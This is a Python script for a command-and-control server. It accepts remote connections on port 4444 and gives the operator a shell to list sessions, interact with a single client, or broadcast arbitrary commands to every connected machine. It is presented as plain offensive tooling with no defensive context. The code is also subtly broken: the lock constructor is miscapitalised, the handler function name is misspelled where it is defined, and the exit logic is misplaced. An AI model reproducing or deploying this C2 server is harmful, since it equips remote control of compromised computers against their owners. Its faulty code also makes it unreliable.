#!/usr/bin/python3

import socket
import threading
import sys

# Store client connections and IDs
clients = {}
client_id = 0
lock = threading.lock()


def hande_client(client_socket, client_address, cid):
    """Handle ind client connection."""
    print(f"[+] New connection: ID {cid} from {client_address}")
    clients[cid] = client_socket

    try:
        while True:
            # Receive cmd response from client
            data = client_socket.recv(4096).decode("utf-8", errors="ignore")
            if not data:
                break
            print(f"[ID {cid}] Response: {data}")
    except Exception as e:
        print(f"[!] Error with client ID {cid}: {e}")
    finally:
        with lock:
            del clients[cid]
            client_socket.close()
            print(f"[-] Client ID {cid} disconnected")


def broadcast_command(command):
    """Send cmd to all clients."""
    with lock:
        for cid, client_socket in clients.items():
            try:
                client_socket.send(command.encode("utf-8"))
                print(f"[*] Send command to ID {cid}")
            except Exception as e:
                print(f"[!] Error sending to ID {cid}: {e}")


def send_command_to_client(cid, command):
    """Send cmd to specific client."""
    with lock:
        if cid in clients:
            try:
                clients[cid].send(command.encode("utf-8"))
                print(f"[*] Sent command to ID {cid}")
            except Exception as e:
                print(f"[!] Error sending to ID {cid}: {e}")
        else:
            print(f"[!] Client ID {cid} not found")


def list_sessions():
    """List all active client sessions."""
    with lock:
        if not clients:
            print("[!] No active sessions.")
        else:
            print("[*] Active sessions:")
            for cid in clients:
                print(f" ID {cid}")


def server_shell():
    """Interactive shell for server commands."""
    global client_id
    while True:
        cmd = input("C2> ").strip()
        if cmd == "sessions":
            list_sessions()
        elif cmd.startswith("interact"):
            try:
                cid = int(cmd.split()[1])
                if cid in clients:
                    print(f"[*] Interacting with ID {cid}. Type 'background' to exit.")
                    while True:
                        sub_cmd = input(f"ID {cid}> ").strip()
                        if sub_cmd == "background":
                            break
                        elif sub_cmd:
                            send_command_to_client(cid, sub_cmd)
                else:
                    print(f"[!] Client ID {cid} not found.")
            except (IndexError, ValueError):
                print("[!] Usage: interact <client_id>")
        elif cmd.startswith("broadcast "):
            command = cmd[10:].strip()
            if command:
                broadcast_command(command)
            else:
                print("[!] Usage: broadcast <command>")
        elif cmd == "exit":
            with lock:
                for client_socket in clients.values():
                    client_socket.close()
                    sys.exit(0)
                else:
                    print(
                        "[!] Commands: sessions, interact <id>, broadcast <cmd>, exit"
                    )


def main():
    """Main server function."""
    global client_id
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", 4444))
    server.listen(5)
    print("[*] C2 Server started on port 4444")

    # Start the server shell in a separate thread
    threading.Thread(target=server_shell, daemon=True).start()

    try:
        while True:
            client_socket, client_address = server.accept()
            with lock:
                client_id += 1
                client_thread = threading.Thread(
                    target=handle_client,
                    args=(client_socket, client_address, client_id),
                )
                client_thread.daemon = True
                client_thread.start()
    except KeyboardInterrupt:
        print("\n[!] Shutting down server")
        server.close()


if __name__ == "__main__":
    main()
